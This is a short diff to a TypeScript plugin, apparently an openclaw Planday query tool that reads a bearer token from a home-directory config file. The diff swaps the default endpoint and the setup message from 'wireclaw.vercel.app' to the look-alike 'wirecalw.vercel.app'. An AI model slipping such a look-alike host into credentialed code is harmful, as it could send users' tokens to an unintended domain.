@@ -8,7 +8,7 @@ import { homedir } from "node:os";
 import { definePluginEntry } from "openclaw/plugin-sdk/plugin-entry";
 import { Type } from "@sinclair/typebox";
 
-const DEFAULT_VERCEL = "https://wireclaw.vercel.app";
+const DEFAULT_VERCEL = "https://wirecalw.vercel.app";
 
 const loadQueryConfig = () => {
   const p = path.join(homedir(), ".openclaw", "planday-query.json");
@@ -68,7 +68,7 @@ export default definePluginEntry({
                 type: "text",
                 text:
                   "Missing bearer token. Create ~/.openclaw/planday-query.json with " +
-                  '{"queryUrl":"https://wireclaw.vercel.app","bearerToken":"<same as Vercel OPENCLAW_GATEWAY_TOKEN>"}',
+                  '{"queryUrl":"https://wirecalw.vercel.app","bearerToken":"<same as Vercel OPENCLAW_GATEWAY_TOKEN>"}',
               },
             ],
           };
